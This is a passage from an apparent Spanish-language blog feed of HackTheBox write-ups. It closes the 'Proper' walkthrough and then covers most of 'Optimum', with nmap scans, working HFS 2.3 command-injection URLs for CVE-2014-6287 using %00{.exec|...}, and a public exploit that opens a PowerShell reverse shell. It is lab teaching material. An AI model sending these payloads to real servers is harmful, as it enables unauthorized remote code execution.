-a----          4/9/2021  25:25 AM            192 QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora intentamos restaurarlo, peeeeero antes, validamos que la ruta &lt;code&gt;C:\\Users\Administrator\Desktop&lt;/code&gt; exista (en mi caso no, la creamos r√°pidamente):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Program Files\Cleanup&amp;gt; ls -force c:\\Users

    Directory: C:\\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         9/28/2020   1:22 PM                Public
d-----         3/29/2021   7:32 PM                Varg

PS C:\Program Files\Cleanup&amp;gt; mkdir C:\\Users\Administrator
PS C:\Program Files\Cleanup&amp;gt; mkdir C:\\Users\Administrator\Desktop
PS C:\Program Files\Cleanup&amp;gt; ls c:\\Users

    Directory: C:\\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/9/2021  11:43 AM                Administrator
d-r---         9/28/2020   1:22 PM                Public
d-----         3/29/2021   7:32 PM                Varg

PS C:\Program Files\Cleanup&amp;gt; ls C:\\Users\Administrator\

    Directory: C:\\Users\Administrator

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/9/2021  11:43 AM                Desktop
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora si restauramos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Program Files\Cleanup&amp;gt; .\client.exe -R C:\\Users\Administrator\Desktop\root.txt
Restoring C:\\Users\Administrator\Desktop\root.txt
PS C:\Program Files\Cleanup&amp;gt; ls C:\ProgramData\Cleanup\
PS C:\Program Files\Cleanup&amp;gt; ls C:\\Users\Administrator\Desktop\

    Directory: C:\\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/9/2021  11:44 AM             34 root.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;üòÆ &lt;strong&gt;:O&lt;/strong&gt; :o &lt;strong&gt;o.O&lt;/strong&gt; üò≤ O.O ohhh‚Ä¶&lt;/p&gt;

&lt;p&gt;Y si vemos su contenido:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Program Files\Cleanup&amp;gt; type C:\\Users\Administrator\Desktop\root.txt
dd355d81...........................74
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;OPAAAAA, pero claro que si!! Tenemos la flag, por lo tanto podemos leer cualquier archivo del sistema como usuario &lt;strong&gt;Administrator&lt;/strong&gt; :O Perfectisimo‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_root_flag_done.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Intentando generar una reverse Shell de alguna manera (no se me ocurre como) nos quedamos un buen rato pensando, pero nada, no lo logramos, si lo sabes me cuentas y lo agregamos al writeup de UNAAAAAAAAAAAA!!&lt;/p&gt;

&lt;p&gt;Hemos terminadooooowowowowowow.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Linda linda liiiiinda m√°quina. Me gusto bastante el camino para llegar al usuario &lt;strong&gt;web&lt;/strong&gt;, fant√°stico el &lt;code&gt;race condition&lt;/code&gt; que explotamos para modificar el contenido del archivo &lt;code&gt;header.inc&lt;/code&gt; inyectando c√≥digo &lt;code&gt;PHP&lt;/code&gt; mientras el servidor lo busca, na na na, muy lindo.&lt;/p&gt;

&lt;p&gt;El pensamiento lateral del &lt;strong&gt;privesc&lt;/strong&gt; es incre√≠ble.&lt;/p&gt;

&lt;p&gt;Much√≠simas gracias por leerse otro writeup gigante, pero que espero les sirva tanto como a m√≠. ¬°Y como siempre, a seguir rompiendo!!&lt;/p&gt;
</description>
        <pubDate>Sat, 21 Aug 2021 00:00:00 -0700</pubDate>
        <link>http://localhost:4000/htb/proper</link>
        <guid isPermaLink="true">http://localhost:4000/htb/proper</guid>
        
        <category>SQLi</category>
        
        <category>RFI</category>
        
        <category>race-condition</category>
        
        <category>RCE</category>
        
        <category>reversing</category>
        
        
        <category>htb</category>
        
      </item>
    
      <item>
        <title>HackTheBox - Optimum</title>
        <description>&lt;p&gt;M√°quina Windows nivel f√°cil. Evitamos los filtros que nos ponga &lt;strong&gt;HTTP File Server&lt;/strong&gt;, transformamos (transformers (optimus prime (optimum (nombre bien pensado eh!)))) nuestra arquitectura y explotamos el siempre triste &lt;strong&gt;kernel&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6optimumHTB.png&quot; alt=&quot;6optimumHTB&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr-spanish-writeup&quot;&gt;TL;DR (Spanish writeup)&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Creada por&lt;/strong&gt;: &lt;a href=&quot;https://www.hackthebox.eu/profile/1&quot;&gt;ch4p&lt;/a&gt; (e l  c r e a d o r).&lt;/p&gt;

&lt;p&gt;Vamos a ‚Äú&lt;strong&gt;transformer&lt;/strong&gt;‚Äù nuestro destino.&lt;/p&gt;

&lt;p&gt;Encontraremos un servidor web con el servicio &lt;code&gt;HTTP File Server&lt;/code&gt; en su versi√≥n &lt;code&gt;2.3&lt;/code&gt;, jugaremos con eso para entender una vulnerabilidad y ejecutar comandos con ella en el sistema. Obtendremos una &lt;strong&gt;reverse Shell&lt;/strong&gt; como el usuario &lt;code&gt;kostas&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Nuestra terminal estar√° limitada a ejecutar procesos de &lt;code&gt;32 bits&lt;/code&gt;, moveremos fichas para generar una nueva, pero que nos permita ejecutar instrucciones de &lt;code&gt;64 bits&lt;/code&gt;, &lt;strong&gt;pero ¬øpara qu√©?‚Ä¶&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Encontraremos varios caminos para escalar privilegios, usaremos uno que se aprovecha del kernel (&lt;code&gt;MS16-135&lt;/code&gt;), peeeeeeeeero para su correcta ejecuci√≥n necesitaremos estar en una arquitectura de &lt;code&gt;64 bits&lt;/code&gt;. &lt;strong&gt;&lt;em&gt;E AY LHA RASON!&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h3 id=&quot;clasificaci√≥n-de-la-m√°quina-seg√∫n-la-gentesita&quot;&gt;Clasificaci√≥n de la m√°quina seg√∫n la gentesita&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6statistics.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vulns conocidas peeeero le cuesta llegar a ser real :(&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Eclipse eterno.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;#reconocimiento&quot;&gt;Reconocimiento&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enum-nmap&quot;&gt;Enumeraci√≥n de puertos con nmap&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeracion&quot;&gt;Enumeraci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#puerto-80&quot;&gt;Exploramos el servicio &lt;strong&gt;HFS&lt;/strong&gt; sobre el puerto 80&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#explotacion&quot;&gt;Explotaci√≥n: jugamos con el servicio &lt;strong&gt;HFS&lt;/strong&gt;&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#hfs-cve-2014-6287&quot;&gt;Validamos ejecuci√≥n remota de comandos usando &lt;strong&gt;CVE-2014-6287&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#escalada-de-privilegios&quot;&gt;Escalada de privilegios&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#ps-architecture&quot;&gt;Descubrimos la arquitectura real en la que corren nuestros scripts de &lt;strong&gt;PowerShell&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#ms16-135&quot;&gt;Explotamos el &lt;strong&gt;kernel&lt;/strong&gt; y obtenemos sesi√≥n como &lt;strong&gt;nt authority\system&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento &lt;a href=&quot;#reconocimiento&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;enum-nmap&quot;&gt;Enumeraci√≥n de puertos con nmap &lt;a href=&quot;#enum-nmap&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Empezaremos viendo que puertos tiene abiertos externamente la m√°quina, esto nos sirve para empezar a direccionar nuestra investigaci√≥n y posterior enumeraci√≥n. Usaremos &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nmap -p- --open -v 10.10.10.8 -oG initScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todos los 65535&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;‚Äìopen&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que est√°n abiertos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oG&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para usar una &lt;a href=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png&quot;&gt;funci√≥n &lt;strong&gt;extractPorts&lt;/strong&gt;&lt;/a&gt; de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; que me extrae los puertos en la clipboard&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Ese escaneo nos muestra:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# Nmap 7.80 scan initiated Wed Aug 18 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.8
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.8 ()	Status: Up
Host: 10.10.10.8 ()	Ports: 80/open/tcp//http///	Ignored State: filtered (65534)
# Nmap done at Wed Aug 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 274.47 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://searchnetworking.techtarget.com/definition/port-80&quot;&gt;HTTP&lt;/a&gt;&lt;/strong&gt;: Nos brinda un servidor web (pagina web).&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Ya que sabemos que solo el puerto &lt;code&gt;80&lt;/code&gt; esta expuesto, vamos a ver que versi√≥n y scripts tienen relaci√≥n con ese puerto, en este caso al ser un solo puerto no es necesario usar la funci√≥n &lt;code&gt;extractPorts&lt;/code&gt; que referenciamos antes, pero en caso de contar con muuuuuchos puertos esta muy bien usarla y no copiar uno a uno cada puerto.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nmap -p 80 -sC -sV 10.10.10.8 -oN portScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo de los puertos obtenidos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Muestra todos los scripts relacionados con el servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nos permite ver la versi√≥n del servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oN&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Y con este escaneo obtenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# Nmap 7.80 scan initiated Wed Aug 18 25:25:25 2021 as: nmap -p 80 -sC -sV -oN portScan 10.10.10.8
Nmap scan report for 10.10.10.8
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 20.80 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tenemos algunas cositas relevantes:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Versi√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HttpFileServer httpd 2.3&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;Servicio &lt;code&gt;Http File Server&lt;/code&gt; en su versi√≥n &lt;code&gt;2.3&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Por ahora nada m√°s (aunque ya con la versi√≥n es bastante e.e). Exploremos el servidor web a ver como romperlo.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;enumeracion&quot;&gt;Enumeraci√≥n &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;puerto-80&quot;&gt;Puerto 80 &lt;a href=&quot;#puerto-80&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como vimos existe un servicio llamado &lt;code&gt;Http File Server&lt;/code&gt; montado en el puerto &lt;code&gt;80&lt;/code&gt;, pues valid√©moslo y en dado caso conozcamos de que se trata‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6page80.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Un poco feita la interfaz üòÅ, pero vemos varias cositas, un link hacia un &lt;code&gt;login&lt;/code&gt;, una barra de b√∫squeda (jmm) y de los dem√°s botones el √∫nico llamativo es &lt;code&gt;Get list&lt;/code&gt; en &lt;strong&gt;&lt;em&gt;Actions&lt;/em&gt;&lt;/strong&gt;, el cual nos redirecciona a:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://10.10.10.8/?tpl=list&amp;amp;folders-filter=\&amp;amp;recursive
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y quiz√°s podr√≠amos jugar con ella‚Ä¶ Veamos de que se trata &lt;strong&gt;HFS&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;üåé &lt;a href=&quot;https://www.rejetto.com/hfs/&quot;&gt;&lt;strong&gt;&lt;em&gt;&lt;code&gt;HFS (HTTP File Server)&lt;/code&gt; es un servidor web dise√±ado para publicar y compartir archivos&lt;/em&gt;&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Bien, sencillito.&lt;/p&gt;

&lt;p&gt;Pues recordemos que tenemos una versi√≥n del software, vamos a la web y busquemos cositas relacionadas con esa versi√≥n, quiz√°s hay vulnerabilidades conocidas‚Ä¶&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;explotacion&quot;&gt;Explotaci√≥n &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Buscando llegamos a este &lt;code&gt;CVE&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287&quot;&gt;cve.mitre.org - CVE-2014-6287&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Se trata de una ejecuci√≥n remota de comandos -gracias- a una pobre sanitizaci√≥n llevada a cabo por expresiones regulares sobre el archivo &lt;code&gt;ParserLib.pas&lt;/code&gt;. La explotaci√≥n se logra mediante un &lt;a href=&quot;https://www.whitehatsec.com/glossary/content/null-byte-injection&quot;&gt;null byte (%00)&lt;/a&gt;, ya que bypassea el regex, detiene tooodo lo anterior a √©l y simplemente ejecuta lo que este despu√©s, o sea, nuestros comandos locochones‚Ä¶&lt;/p&gt;

&lt;p&gt;‚ö™‚ö™‚ö™ &lt;strong&gt;&lt;em&gt;&lt;code&gt;Null bytes&lt;/code&gt; are put in place to terminate strings or be a place holder in code, and injecting these into URLs can cause web applications to not know when to terminate strings and manipulate the applications.&lt;/em&gt;&lt;/strong&gt; &lt;a href=&quot;https://www.whitehatsec.com/glossary/content/null-byte-injection&quot;&gt;whitehatsec&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Uff suena prometedor, investigando un poquito m√°s llegamos es este recurso:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://subscription.packtpub.com/book/networking_and_servers/9781786463166/1/ch01lvl1sec20/vulnerability-analysis-of-hfs-2-3&quot;&gt;Vulnerability analysis of HFS 2.3&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Un an√°lisis de la vuln, esta bien detallado, &lt;span style=&quot;color: white;&quot;&gt;√©chenle un ojo.&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;hfs-cve-2014-6287&quot;&gt;Validamos &lt;u&gt;RCE&lt;/u&gt; explotando &lt;u&gt;CVE-2014-6287&lt;/u&gt; &lt;a href=&quot;#hfs-cve-2014-6287&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Leyendo sobre la explotaci√≥n, todo pasa en el apartado &lt;code&gt;search&lt;/code&gt; (en nuestra enumeraci√≥n anterior lo vimos).&lt;/p&gt;

&lt;p&gt;Una consulta normal por ejemplo del texto &lt;code&gt;hola&lt;/code&gt;, redireccionar√≠a a:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://10.10.10.8/?search=hola
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ver√≠amos esto:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6page80_search_holaNORMAL.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nada anormal‚Ä¶&lt;/p&gt;

&lt;p&gt;En el caso de la explotaci√≥n la consulta ser√≠a distinta, ya que se le agrega el &lt;code&gt;null byte&lt;/code&gt; para bypassear el filtro regex yyyyyy simplemente agregar√≠amos el comando a ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-py&quot;&gt;http://10.10.10.8/?search=hola%00{.exec|aca_el_comando_a_ejecutar.}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Por ejemplo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-py&quot;&gt;http://10.10.10.8/?search=hola%00{.exec|whoami.}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En la respuesta ver√≠amos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6page80_search_holaWITHnullBYTE_execWHOAMI.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo √∫nico distinto que vemos es un s√≠mbolo al lado de &lt;code&gt;hola&lt;/code&gt;, pero no tenemos el reflejo del comando &lt;code&gt;whoami&lt;/code&gt; üòî&lt;/p&gt;

&lt;p&gt;Como una de las pruebas que debemos hacer seria intentar lanzarnos paquetes &lt;code&gt;ICMP&lt;/code&gt; con ayuda del comando &lt;code&gt;ping&lt;/code&gt;, si en nuestra m√°quina recibimos los paquetes entonces confirmamos que existe la ejecuci√≥n remota de comandos solo que no se reflejan en la web. Pues pong√°monos en escucha por la interfaz &lt;a href=&quot;https://www.reddit.com/r/networking/comments/5mnnjh/explanation_on_tun0_network_device/&quot;&gt;tun0&lt;/a&gt; (donde se monta la &lt;strong&gt;VPN&lt;/strong&gt;, en mi caso solo tengo la de HTB**, la confirman con &lt;code&gt;ipconfig&lt;/code&gt; o &lt;code&gt;ip a&lt;/code&gt;) y estemos atentos por si llegan paquetes &lt;code&gt;ICMP&lt;/code&gt; (que son los que env√≠a el comando &lt;code&gt;ping&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± tcpdump -i tun0 icmp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ahora desde la web lanzamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-py&quot;&gt;http://10.10.10.8/?search=hola%00{.exec|ping%2010.10.14.2.}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero no recibimos nada, seguimos probando‚Ä¶ Yyyy finalmente llegamos al resultado de este intento:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-py&quot;&gt;http://10.10.10.8/?search=hola%00{.exec|powershell.exe -c &quot;ping 10.10.14.2&quot;.}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Cuando lo ejecutamos en la web no vemos nada reflejado (tampoco deber√≠a), peeeeeeeeeeero en nuestro analizador de tr√°fico:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_tcpdump_ICMPreceived.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos los paquetes enviados por la direcci√≥n IP &lt;code&gt;10.10.10.8&lt;/code&gt; (la m√°quina v√≠ctima) hacia nuestra m√°quina, as√≠ que existe la ejecuci√≥n remota de comandos (: YYYYYYYYYYYYYy entendimos como funciona la vulnerabilidad.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6google_gif_snoopdogDANCEhappy.gif&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Ahora que sabemos que los comandos se est√°n ejecutando podemos aprovecharnos de un exploit p√∫blico el cual &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell&quot;&gt;lanza una reverse Shell generada con &lt;code&gt;PowerShell&lt;/code&gt;&lt;/a&gt;, la encodea a &lt;strong&gt;base64&lt;/strong&gt; y como comandos que ejecutara el sistema le indica que decodee la cadena y la interprete. No debemos ponernos en escucha, ya que el mismo script lo hace: &lt;code&gt;nc -nlvp el_puerto_que_le_indiquemos&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/49584&quot;&gt;HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Lo descargamos y en su c√≥digo cambiamos las variables &lt;code&gt;lhost&lt;/code&gt; por nuestra direcci√≥n IP y &lt;code&gt;lport&lt;/code&gt; por el puerto en el que queremos recibir la Shell. (El exploit fue creado para esta m√°quina, ya que trae por default que el servidor vulnerable esta sirviendo en la direcci√≥n IP &lt;code&gt;10.10.10.8&lt;/code&gt;)&lt;/p&gt;

&lt;p&gt;Y ahora si lo ejecutamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± python3 hfsRCE.py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_scriptPY_kostasRevSH_done.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;PEEEEEEEEEEEEEEEERFECTIIIIIIIIIIiii11isadifjoasdifjSIMOOOOOOOoo, tenemos una &lt;strong&gt;PowerShell&lt;/strong&gt; en el sistema como el usuario &lt;code&gt;kostas&lt;/code&gt; (:&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Despu√©s de estar en un laberinto suuuuuuuper largo finalmente conseguimos explotar esta vaina.&lt;/p&gt;

&lt;p&gt;Enumerando el sistema vemos que podemos ejecutar &lt;code&gt;systeminfo&lt;/code&gt;, aprovechemos las muuuuuuchas herramientas que existen para ver si el kernel o la versi√≥n del SO tiene alguna vulnerabilidad.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://oscp.securable.nl/privilege-escalation&quot;&gt;Apoyados en esta gu√≠a de &lt;strong&gt;PrivEsc&lt;/strong&gt; caemos en nuestro siguiente recurso&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;El que nos muestra unos resultados sencillos y directos es &lt;a href=&quot;https://github.com/rasta-mouse/Sherlock&quot;&gt;Sherlock&lt;/a&gt; (que ya esta obsoleto, pero sigue funcionando), &lt;strong&gt;Sherlock&lt;/strong&gt; es un script de &lt;code&gt;PowerShell&lt;/code&gt; que busca vulnerabilidades relacionadas con ‚Äúparches‚Äù del sistema.&lt;/p&gt;

